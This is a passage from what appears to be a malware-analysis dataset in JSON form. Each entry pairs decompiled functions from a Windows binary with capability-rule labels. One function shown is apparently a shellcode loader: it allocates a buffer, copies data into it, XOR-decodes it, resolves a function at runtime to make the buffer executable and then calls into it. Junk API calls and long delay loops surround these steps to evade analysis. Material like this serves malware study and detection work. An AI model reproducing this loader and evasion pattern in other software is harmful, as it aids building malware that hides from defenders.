uVar2 = arg_ch[0x12];\n            uVar3 = arg_ch[0x13];\n            uVar4 = arg_ch[0x14];\n            uVar5 = arg_ch[0x15];\n            uVar6 = arg_ch[0x16];\n            uVar7 = arg_ch[0x17];\n            uVar8 = arg_ch[0x18];\n            uVar9 = arg_ch[0x19];\n            uVar10 = arg_ch[0x1a];\n            uVar11 = arg_ch[0x1b];\n            uVar12 = arg_ch[0x1c];\n            uVar13 = arg_ch[0x1d];\n            uVar14 = arg_ch[0x1e];\n            uVar15 = arg_ch[0x1f];\n            puVar18[0x10] = arg_ch[0x10];\n            puVar18[0x11] = uVar1;\n            puVar18[0x12] = uVar2;\n            puVar18[0x13] = uVar3;\n            puVar18[0x14] = uVar4;\n            puVar18[0x15] = uVar5;\n            puVar18[0x16] = uVar6;\n            puVar18[0x17] = uVar7;\n            puVar18[0x18] = uVar8;\n            puVar18[0x19] = uVar9;\n            puVar18[0x1a] = uVar10;\n            puVar18[0x1b] = uVar11;\n            puVar18[0x1c] = uVar12;\n            puVar18[0x1d] = uVar13;\n            puVar18[0x1e] = uVar14;\n            puVar18[0x1f] = uVar15;\n            arg_ch = arg_ch + 0x20;\n            puVar18 = puVar18 + 0x20;\n        }\n        if ((arg_10h & 0x7f) != 0) {\n            for (uVar16 = (arg_10h & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {\n                uVar1 = arg_ch[1];\n                uVar2 = arg_ch[2];\n                uVar3 = arg_ch[3];\n                *puVar18 = *arg_ch;\n                puVar18[1] = uVar1;\n                puVar18[2] = uVar2;\n                puVar18[3] = uVar3;\n                arg_ch = arg_ch + 4;\n                puVar18 = puVar18 + 4;\n            }\n            if ((arg_10h & 0xf) != 0) {\n                for (uVar16 = (arg_10h & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    puVar18 = puVar18 + 1;\n                }\n                for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    puVar18 = puVar18 + 1;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar18 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar17 = arg_10h >> 2;\n        if (uVar17 < 8) goto code_r0x00404570;\n        for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n            *puVar18 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar18 = puVar18 + 1;\n        }\n    // switch table (4 cases) at 0x404660\n        switch(*((arg_10h & 3) * 4 + 0x404660)) {\n        case 0x404678:\ncode_r0x00404678:\n            *puVar18 = *arg_ch;\n            return arg_8h;\n        case 0x404684:\ncode_r0x00404684:\n            *puVar18 = *arg_ch;\n            *(puVar18 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x404698:\ncode_r0x00404698:\n            *puVar18 = *arg_ch;\n            *(puVar18 + 1) = *(arg_ch + 1);\n            *(puVar18 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x404670)) {\n        case 0x404678:\n            goto code_r0x00404678;\n        case 0x404684:\n            goto code_r0x00404684;\n        case 0x404698:\n            goto code_r0x00404698;\n        }\n    }\n    else {\n        uVar16 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x404574)) {\n        case 0x404584:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar17 = uVar16 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar18 = arg_8h + 3;\n            if (uVar17 < 8) {\ncode_r0x00404570:\n    // WARNING: Could not recover jumptable at 0x00404570. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x4045f4\n                puVar18 = (**(uVar17 * 4 + 0x4045f4))();\n                return puVar18;\n            }\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x404660)) {\n            case 0x404678:\n                goto code_r0x00404678;\n            case 0x404684:\n                goto code_r0x00404684;\n            case 0x404698:\n                goto code_r0x00404698;\n            }\n            break;\n        case 0x4045b0:\n            *arg_8h = *arg_ch;\n            uVar17 = uVar16 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar18 = arg_8h + 2;\n            if (uVar17 < 8) goto code_r0x00404570;\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x404660)) {\n            case 0x404678:\n                goto code_r0x00404678;\n            case 0x404684:\n                goto code_r0x00404684;\n            case 0x404698:\n                goto code_r0x00404698;\n            }\n            break;\n        case 0x4045d4:\n            *arg_8h = *arg_ch;\n            uVar17 = uVar16 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar18 = arg_8h + 1;\n            if (uVar17 < 8) goto code_r0x00404570;\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x404660)) {\n            case 0x404678:\n                goto code_r0x00404678;\n            case 0x404684:\n                goto code_r0x00404684;\n            case 0x404698:\n                goto code_r0x00404698;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 4115
    },
    "00409b3d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409b3d(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00405c93(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "007b1ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.007b1ff0(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "007b2200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.007b2200(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint extraout_var;\n    int32_t iVar8;\n    \n    if (*0x3a57918 == 0xce0) {\n        fcn.00404851(0x7b4f48, 0x4043ec, 0x4043cc);\n        fcn.004048e0(0, extraout_var);\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_SetEndOfFile;\n    pcVar3 = _sym.imp.KERNEL32.dll_UpdateResourceW;\n    pcVar2 = _sym.imp.KERNEL32.dll__lread;\n    pcVar1 = _sym.imp.ADVAPI32.dll_DestroyPrivateObjectSecurity;\n    iVar8 = 0x5185da7;\n    iVar5 = *0x3a57918;\n    do {\n        if (iVar5 == 0xcd2) {\n            (*pcVar2)(0, 0, 0);\n            (*pcVar3)(0, 0, 0, 0, 0, 0);\n            (*pcVar1)(0);\n            iVar5 = *0x3a57918;\n        }\n        if (iVar5 == 0xa67) {\n            (*pcVar4)(0);\n            iVar5 = *0x3a57918;\n        }\n        if (iVar5 == 0xce1) {\n            *0x7b4fb8 = 0xcd51fc44;\n        }\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    *0x3a57918 = *0x7b42a4 + 0xd0f5;\n    *0x3a57758 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, *0x3a57918);\n    pcVar1 = _sym.imp.KERNEL32.dll_PurgeComm;\n    iVar8 = 0;\n    uVar7 = *0x3a57918;\n    do {\n        if (iVar8 == 0x1863b7) {\n            *0x3a5791c = *0x7b4298;\n        }\n        if (uVar7 == 0x1226) {\n            (*pcVar1)(0, 0);\n            uVar7 = *0x3a57918;\n        }\n        iVar5 = *0x3a5791c;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x29a8dc);\n    uVar6 = 0;\n    if (uVar7 != 0) {\n        do {\n            (*0x3a57758)[uVar6] = *(iVar5 + 0xd0f5 + uVar6);\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < uVar7);\n    }\n    fcn.007b20f0();\n    fcn.007b21c0();\n    fcn.007b1ff0();\n    iVar8 = 0;\n    do {\n        *0x3a57770 = 0;\n        *0x3a57774 = 0;\n        if (iVar8 == 0x194eab) {\n            (**0x3a57758)();\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x54ed46);\n    return;\n}\n",
        "token_count": 790
    },
    "0040b8ac": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040b8ac(void)\n\n{\n    *0x7b3ea0 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x403890, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "007b2160": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.007b2160(void)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBX;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    \n    if (unaff_EDI == 0x1149) {\n        (*_sym.imp.KERNEL32.dll_GetNumberOfConsoleMouseButtons)(0);\n        (*_sym.imp.KERNEL32.dll_GetStringTypeExW)(0, 0, 0, 0, &stack0xfffffff0);\n    }\n    iVar2 = 0;\n    if (0 < unaff_EDI) {\n        do {\n            if (unaff_EDI == 0x469) {\n                (*_sym.imp.KERNEL32.dll_GetProcessWorkingSetSize)(0, 0, 0);\n            }\n            uVar1 = fcn.007b2000();\n            *(iVar2 + unaff_EBX) = *(iVar2 + unaff_EBX) ^ uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "007b20f0": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.007b20f0(void)\n\n{\n    code *pcVar1;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0x4043ac;\n    uStack12 = 0x7b4f48;\n    uStack16 = 0x7b2101;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)();\n    uStack16 = 0x7b4f48;\n    uStack20 = 0x7b210c;\n    uStack24 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack20 = 0x4043bc;\n    pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    (*pcVar1)(*0x3a57758, *0x3a57918, 0x40, &stack0xffffffe8);\n    return;\n}\n",
        "token_count": 214
    },
    "007b21c0": {
        "rules": [
            "get service handle"
        ],
        "decompiled_code": "\nvoid fcn.007b21c0(void)\n\n{\n    fcn.007b2130();\n    if (*0x3a57918 == 0x263) {\n        (*_sym.imp.ADVAPI32.dll_OpenServiceW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_ResetEvent)(0);\n    }\n    fcn.007b2160();\n    return;\n}\n",
        "token_count": 89
    }
}